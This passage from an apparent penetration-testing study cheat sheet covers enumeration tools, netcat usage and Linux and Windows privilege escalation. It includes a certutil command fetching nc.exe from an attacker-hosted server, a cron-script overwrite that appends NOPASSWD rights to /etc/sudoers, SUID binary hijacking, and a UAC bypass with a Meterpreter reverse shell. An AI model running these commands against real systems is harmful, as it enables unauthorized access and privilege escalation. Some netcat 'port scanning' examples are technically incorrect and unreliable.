crackmapexec mssql -u admin -p pass123 -M mssql_priv
```

- Crackmapexec reference: [stationx - crackmapexec](https://www.stationx.net/crackmapexec-cheat-sheet/)


### Directory Buster

Enumerate directories of a website from a wordlist

#### dirb

```sh
dirb example.com ~/SecList/wordlists/Discovery/Web-Content/common.txt
```

#### gobuster

Examples:
```sh
gobuster dir -u example.com -w ~/SecList/wordlists/Discovery/Web-Content/common.txt
```

```sh
gobuster dir -u 10.10.35.63 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```


### Networking

#### Linux

```sh
ip route
```

#### Windows

```sh
route print
```

#### Mac OS X/Linux

```sh
netstat -r
```

### Information Gathering (Passive)

Help enumerate website information

```sh
whatweb 192.168.1.10
```

```sh
host example.com
```

#### DNS

```sh
whois example.com
whois 192.168.1.10
```

Note: Be careful using dnsenum. It carries out bruteforce by default.

```sh
dnsenum example.com
```

### Netcat (nc)

Netcat is a utility tool that reads and writes data across network connections (source: [Netcat homepage](https://netcat.sourceforge.net/))

```sh
nc 10.4.20.244
```

Frequently used Netcat options/parameters:
`-n`: Avoid DNS resolution
`-v`: Verbose output
`-l`: listening (on a port)
`-p`: specifying the port

```sh
# Frequently used
nc -nv 10.4.20.244 1234

# Not that used much (separating options)
nc -n -v 10.4.20.244 1234
```

#### Port scanning using Netcat

```sh
# HTTP
nc -nvlp 10.4.20.244 80
```

```sh
# FTP
nc -nvlp 10.4.20.244 21
```

```sh
# SSH
nc -nvlp 10.4.20.244 22
```

```sh
# SMB
nc -nvlp 10.4.20.244 445
```
etc.

#### Transferring Netcat from Kali Linux to Windows

Scenario: 
Suppose we're connecting machine A (Kali) and machine B (Windows).
- Kali Linux IP: 192.168.1.45
- Windows IP: 192.168.1.33

Background:
Netcat is pre-installed in Kali Linux, but not in Windows. Fortunately, Kali Linux comes with Netcat executable (`nc.exe`)

1. In Kali, we need to locate where `nc.exe` is:
```sh
locate nc.exe
```

2. Copy `nc.exe` to the current directory:
```sh
cp /usr/windows-resources/nc.exe .
```

3. In the directory you copied `nc.exe` to, run Python server to host the file:
```sh
python -m SimpleHTTPServer 80
```

4. Go to Windows and open CommandPrompt (cmd) to execute this:
```sh
certutil -urlcache -f http://192.168.1.45/nc.exe nc.exe
```
[Certutil](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732443(v=ws.11)) exists by default on most versions of Windows

5. Test `nc.exe` in Windows:
```sh
nc.exe --help
```

##### Connecting 2 machines

Kali:
```sh
nc -nvlp 1234
```

Windows:
```sh
nc.exe -nv 192.168.1.45 1234 
```


## Privilege Escalation

To-do: Complete this section

### Linux PrivEsc

1. Linux Kernel Exploit (e.g.: Dirtycow)

Main idea: Running `linux-exploit-suggester` and find out possible vulnerabilities in the target system based on its kernel version

General idea:
- Download `linux-exploit-sggester` and make it executable:

```sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh
```

```sh
chmod +x linux-exploit-suggester.sh
```

- Run it:

```sh
./linux-exploit-suggester.sh
```

A sample output of Linux Exploit Suggester:
```sh
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                          
[+] [CVE-2022-2586] nft_object UAF                                                                                                                          

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


Vulnerable to CVE-2021-3560
```

Dirtycow: https://www.exploit-db.com/exploits/40839

2. Miconfigured CronJobs

- List available cronjobs:
```sh
crontab -l
```

- (Attempting to) modify the cronjob (e.g.: shellscript):
```sh
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > <CRONJOB_SCRIPT>
```

Example: let's say the cronjob script is `/usr/local/share/script.sh`
```sh
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/script.sh
```

3. Abusing SUID

Case-1: often used in exams
- List files (in a directory where there might be a file that we can take advantage of exists):
```sh
ls -la
```

- Check if there's SUID:
```sh
file <filename>
```

- Find if there's a binary called by the file:
```sh
strings <filename>
```

- If there's one, remove the binary:
```sh
rm <binary>
```

- Replace the binary with `/bin/bash` to invoke a shell:
```sh
cp /bin/bash <binary>
```

- Execute the file (not the binary):
```sh
./<filename>
```

Case-2: Find SUID files owned by root
```sh
find / -user root -perm /4000 2>/dev/null
```

Likely output:
```sh
/usr/lib/policykit-1/polkit-agent-helper-1
...
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexe
...
/snap/core/8268/bin/umount
```


### Windows PrivEsc

1. Windows Kernel Exploit

- Running Windows-Exploit-Suggester

2. Bypassing UAC (e.g.: UACme)

Main idea: Using Akagi64.exe or Akagi32.exe

General idea:
- In tab 1, find an existing vulnerability to get a remote access to a target system (e.g. : BadBlue)
- Open a new tab (tab 2), then generate an Msfvenom payload (e.g. : windows/meterpreter/reverse_tcp) in .exe format. Let's say the name is `backup.exe`
- Go back to tab 1 and upload the Msfvenom payload (.exe) and Akagi64.exe in `C:\Temp` folder
- Jump into tab 2. Open msfconsole and use the `exploit/multi/handler` module to set up a listener
- Return to tab 1 and execute Akagi64.exe and the Msfvenom payload: `.\Akagi64.exe 23 backup.exe`
- You'll see a meterpreter shell in the listener in tab 2 with an elevated access (`NT AUTHORITY\SYSTEM`)


3. Access Token Impersonation

Main idea: Loading incognito plugin on Metasploit and impersonate `NT AUTHORITY\SYSTEM`'s token

General idea:
- Gain access to target system via Meterpreter
- Load incognito module
- List available tokens and impersonate `ATTACKDEFENSE\Administrator`'s token
- Grep `explorer.exe`'s pid and migrate to it
- List available tokens and impersonate `NT AUTHORITY\SYSTEM`'s token


## Resources

- [Web Application Attacks](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-9-web-application-attacks)
- [Hacking the OSCP: Web Apps](https://securing.dev/posts/hacking-the-oscp-web-apps/)
- [GTFO Bins - Unix binaries to bypass local security restrictions](https://gtfobins.github.io/)
- [Shellter](https://www.shellterproject.com/homepage/)
- [INE Training Notes - syselement](https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet)
